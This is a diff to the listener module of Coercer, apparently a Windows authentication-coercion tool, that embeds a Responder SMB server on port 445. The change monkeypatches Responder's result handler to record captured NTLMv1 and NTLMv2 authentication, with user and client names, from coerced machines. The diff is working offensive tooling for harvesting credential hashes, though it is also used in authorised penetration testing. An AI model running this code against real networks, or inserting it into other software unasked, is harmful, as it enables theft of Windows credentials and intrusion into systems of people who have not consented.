@@ -4,9 +4,95 @@
 # Author             : Podalirius (@podalirius_)
 # Date created       : 15 Sep 2022
 
+from collections import namedtuple
 import socket
 import time
+import threading
 from coercer.structures.TestResult import TestResult
+
+
+responder_options = dict(
+    Domain='domain',
+    Interface='ALL',
+    ExternalIP=None,
+    ExternalIP6=None,
+    LM_On_Off=False,
+    NOESS_On_Off=False,
+    WPAD_On_Off=False,
+    DHCP_On_Off=False,
+    ProxyAuth_On_Off=False,
+    DHCP_DNS=False,
+    Basic=False,
+    OURIP=None,
+    Force_WPAD_Auth=False,
+    Upstream_Proxy=None,
+    Analyze=True,
+    Verbose=False,
+    )
+
+ResponderOptions = namedtuple(
+    'ResponderOptions',
+    responder_options.keys(),
+    )
+
+
+def create_smb_server(control_structure, listen_ip, interface, lock):
+    """Factory function for creating a SMBServer object"""
+
+    def record_result(result):
+        if control_structure["result"] in [
+            TestResult.SMB_AUTH_RECEIVED_NTLMv1,
+            TestResult.SMB_AUTH_RECEIVED_NTLMv2,
+        ]:
+            # Already handled; do nothing
+            return
+
+        print("[+] Authentication received: "
+              "[%(module)s] %(type)s - %(user)s@%(client)s\n" % result)
+
+        if result['type'] in ['NTLMv1', 'NTLMv1-SSP']:
+            control_structure["result"] = TestResult.SMB_AUTH_RECEIVED_NTLMv1
+        elif result['type'] in ['NTLMv2', 'NTLMv2-SSP']:
+            control_structure["result"] = TestResult.SMB_AUTH_RECEIVED_NTLMv2
+        else:
+            return
+
+        lock.release()
+        # This should cause the responder loop to break
+        raise Exception
+
+    # Load Responder code
+    from coercer.ext.responder import utils
+    utils.color == str
+    # Set responder settings
+    from coercer.ext.responder import settings
+    settings.init()
+    responder_options.update(dict(ExternalIP=listen_ip, OURIP=listen_ip))
+    responder_options.update(dict(Interface=interface))
+    options = ResponderOptions(*responder_options.values())
+    settings.Config.populate(options)
+    from coercer.ext.responder import SMB
+    from coercer.ext.responder import Responder
+    # Monkeypatch SaveToDb
+    # Note that this is an ugly hack equivalent to modifying a global variable.
+    # This will prevent Coercer from parallelizing.
+    SMB.SaveToDb = record_result
+
+    class SMBServer(threading.Thread):
+        def run(self_):
+            # FIXME I wanted to bind to listen_ip, but that allows yields:
+            #  'Address family for hostname not supported'
+            self_.server = Responder.ThreadingTCPServer(('', 445), SMB.SMB1)
+            self_.server.allow_reuse_address = True
+            self_.server.serve_forever()
+
+        def shutdown(self_):
+            self_.server.shutdown()
+            self_.server.server_close()
+
+    lock.acquire()
+    smb_server = SMBServer()
+    return smb_server
 
 
 class Listener(object):
@@ -37,26 +123,12 @@ class Listener(object):
         """
         Function start_smb(self, control_structure)
         """
-        start_time = int(time.time())
-        stop_time = start_time + self.timeout
-        while (int(time.time()) < stop_time) and control_structure["result"] == TestResult.NO_AUTH_RECEIVED:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                s.bind((self.listen_ip, self.smb_port))
-                s.listen(5)
-                conn, address = s.accept()
-                data = conn.recv(2048)
-                # Win11 2208:  b'\x00\x00\x00E\xffSMBr\x00\x00\x00\x00\x18S\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe\x00\x00\x00\x00\x00"\x00\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
-                # WinServ2016: b'\x00\x00\x00\x9b\xffSMBr\x00'
-                # b'\x00\x00\x00\xfc\xfeSMB@\x00\x01\x00\x00\x00\x00\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x05\x00\x02\x00\x00\x00\x7f\x00\x00\x00\x12\xe3\x9f\x90\xfa7\xed\x11\x98.\xe8\xd8\xd1\xf3/\xf9p\x00\x00\x00\x05\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\xec-\xd9\x94\xf2{D\x91\xd54\xb48KW\xbe\x81uM&\xbd.q\xff\xc3\xcb\x90\x87\x11\x1c\xbd9\xd8\x00\x00\x02\x00\x06\x00\x00\x00\x00\x00\x02\x00\x02\x00\x01\x00\x00\x00\x03\x00\x10\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x04\x00\x02\x00\x03\x00\x01\x00\x05\x00\x1a\x00\x00\x00\x00\x00F\x00R\x00T\x00L\x00S\x00E\x00Q\x00P\x00R\x00N\x00P\x000\x001\x00\x00\x00\x00\x00\x00\x00\x06
-                if data.startswith(b'\x00\x00\x00') and b'SMB' in data:
-                    # TODO: Handle SMB handshake better than this.
-                    control_structure["result"] = TestResult.SMB_AUTH_RECEIVED
-                else:
-                    print("\n", data)
-            except Exception as e:
-                pass
+        lock = threading.Lock()
+        smb_server = create_smb_server(control_structure, self.listen_ip,
+                                       self.options.interface or 'ALL', lock)
+        smb_server.start()
+        lock.acquire(timeout=self.timeout)
+        smb_server.shutdown()
 
     def start_http(self, control_structure, http_port=80):
         """
